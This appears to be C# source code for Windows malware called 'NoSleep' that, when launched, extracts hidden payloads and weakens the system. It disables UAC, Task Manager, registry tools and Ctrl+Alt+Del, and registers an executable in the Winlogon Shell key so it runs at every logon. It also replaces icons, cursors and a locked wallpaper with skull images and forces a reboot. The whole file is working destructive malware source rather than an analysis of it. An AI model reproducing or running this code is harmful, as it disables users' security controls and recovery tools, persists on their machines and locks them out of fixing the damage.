using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading;

namespace NoSleep
{
    public partial class NoSleep : Form
    {
        public NoSleep()
        {
            InitializeComponent();
        }
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        private void NoSleep_Load(object sender, EventArgs e)
        {
            if(!File.Exists(@"C:\Program Files\Temp\NoSleep.exe"))
            {
                Directory.CreateDirectory(@"C:\Program Files\Temp");
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "a lot of skulls.jpg");
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "disctrl.reg");
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "hol333.ani");
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "NoSleeper.jpg");
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "skull_real.png");
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "skull_real_ico.ico");
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "some_music.wav");
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "some_video.mp4");
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "NoSleep.exe"); 
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "AxInterop.WMPLib.dll"); //dll import for video
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "Interop.WMPLib.dll"); //dll import for video
                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "RSOD.exe"); //we need to create fake logonui
                File.Copy(@"C:\Program Files\Temp\NoSleep.exe", @"C:\Program Files\Temp\hell.exe");

                //Disable ctrl+alt+del
                const string quote = "\"";
                ProcessStartInfo ctrlaltdel = new ProcessStartInfo();
                ctrlaltdel.FileName = "cmd.exe";
                ctrlaltdel.WindowStyle = ProcessWindowStyle.Hidden;
                ctrlaltdel.Arguments = @"/k regedit /s " + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit";
                Process.Start(ctrlaltdel);

                //Some reg keys
                RegistryKey keyUAC = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                keyUAC.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                RegistryKey folder = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons");
                folder.SetValue("3", "C:\\Program Files\\Temp\\skull_real_ico.ico", RegistryValueKind.String);
                RegistryKey folder2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons");
                folder2.SetValue("4", "C:\\Program Files\\Temp\\skull_real_ico.ico", RegistryValueKind.String);
                RegistryKey explorer = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                explorer.SetValue("Shell", "explorer.exe, C:\\Program Files\\Temp\\hell.exe", RegistryValueKind.String);
                RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                RegistryKey ico_exe = Registry.ClassesRoot.CreateSubKey("exefile\\DefaultIcon");
                ico_exe.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_giff = Registry.ClassesRoot.CreateSubKey("giffile\\DefaultIcon");
                ico_giff.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_htlm = Registry.ClassesRoot.CreateSubKey("htlm\\DefaultIcon");
                ico_htlm.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_icmfile = Registry.ClassesRoot.CreateSubKey("icmfile\\DefaultIcon");
                ico_icmfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_icofile = Registry.ClassesRoot.CreateSubKey("icofile\\DefaultIcon");
                ico_icofile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_inffile = Registry.ClassesRoot.CreateSubKey("inffile\\DefaultIcon");
                ico_inffile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_inifile = Registry.ClassesRoot.CreateSubKey("inifile\\DefaultIcon");
                ico_inifile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_jntfile = Registry.ClassesRoot.CreateSubKey("jntfile\\DefaultIcon");
                ico_jntfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_jpegfile = Registry.ClassesRoot.CreateSubKey("jpegfile\\DefaultIcon");
                ico_jpegfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_JSEFile = Registry.ClassesRoot.CreateSubKey("JSEFile\\DefaultIcon");
                ico_JSEFile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_JSFile = Registry.ClassesRoot.CreateSubKey("JSFile\\DefaultIcon");
                ico_JSFile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_mscfile = Registry.ClassesRoot.CreateSubKey("mscfile\\DefaultIcon");
                ico_mscfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_pjpegfile = Registry.ClassesRoot.CreateSubKey("pjpegfile\\DefaultIcon");
                ico_pjpegfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_pnffile = Registry.ClassesRoot.CreateSubKey("pnffile\\DefaultIcon");
                ico_pnffile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_pngfile = Registry.ClassesRoot.CreateSubKey("pngfile\\DefaultIcon");
                ico_pngfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_txt = Registry.ClassesRoot.CreateSubKey("txtfile\\DefaultIcon");
                ico_txt.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_ratfile = Registry.ClassesRoot.CreateSubKey("ratfile\\DefaultIcon");
                ico_ratfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_regfile = Registry.ClassesRoot.CreateSubKey("regfile\\DefaultIcon");
                ico_regfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_sysfile = Registry.ClassesRoot.CreateSubKey("sysfile\\DefaultIcon");
                ico_sysfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_textfile = Registry.ClassesRoot.CreateSubKey("textfile\\DefaultIcon");
                ico_textfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_xmlfile = Registry.ClassesRoot.CreateSubKey("xmlfile\\DefaultIcon");
                ico_xmlfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_zapfile = Registry.ClassesRoot.CreateSubKey("zapfile\\DefaultIcon");
                ico_zapfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_dllfile = Registry.ClassesRoot.CreateSubKey("dllfile\\DefaultIcon");
                ico_dllfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_jarfile = Registry.ClassesRoot.CreateSubKey("jarfile\\DefaultIcon");
                ico_jarfile.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_recycle = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon");
                ico_recycle.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_recycle2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon");
                ico_recycle2.SetValue("empty", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_recycle3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon");
                ico_recycle3.SetValue("full", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_pic = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon");
                ico_pic.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_idk1 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\DefaultIcon");
                ico_idk1.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_idk2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{871C5380-42A0-1069-A2EA-08002B30309D}\\DefaultIcon");
                ico_idk2.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_idk3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}\\DefaultIcon");
                ico_idk3.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_idk5 = Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{031E4825-7B94-4dc3-B131-E946B44C8DD5}\\DefaultIcon");
                ico_idk5.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey ico_idk4 = Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{1248BD21-B584-4EB8-85D0-8EC479CD043B}\\DefaultIcon");
                ico_idk4.SetValue("", "C:\\Program Files\\Temp\\skull_real_ico.ico");
                RegistryKey cur = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur.SetValue("", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur2.SetValue("AppStarting", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur3 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur3.SetValue("Arrow", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur4 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur4.SetValue("Hand", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur5 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur5.SetValue("Help", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur6 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur6.SetValue("No", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur7 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur7.SetValue("NWPen", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur8 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur8.SetValue("SizeAll", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur9 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur9.SetValue("SizeNESW", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur10 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur10.SetValue("SizeNS", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur11 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur11.SetValue("SizeNWSE", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur12 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur12.SetValue("SizeWE", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur13 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur13.SetValue("UpArrow", "C:\\Program Files\\Temp\\hol333.ani");
                RegistryKey cur14 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur14.SetValue("Wait", "C:\\Program Files\\Temp\\hol333.ani");
                //Replace wallpaper
                RegistryKey wallpaper = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                wallpaper.SetValue("Wallpaper", "C:\\Program Files\\Temp\\a lot of skulls.jpg");
                RegistryKey wallpaperstyle = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                wallpaperstyle.SetValue("WallpaperStyle", "2");
                RegistryKey noremovewall = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
                noremovewall.SetValue("NoChangingWallPaper", 1, RegistryValueKind.DWord);

                //Restart 
                Thread.Sleep(5000);
                Process.Start("shutdown", "/r /t 0");
                Environment.Exit(-1);
            }
            else
            {
                this.Hide();
                var NewForm = new NoSleep_windows();
                NewForm.ShowDialog();
                this.Close();
            }
        }
    }
}
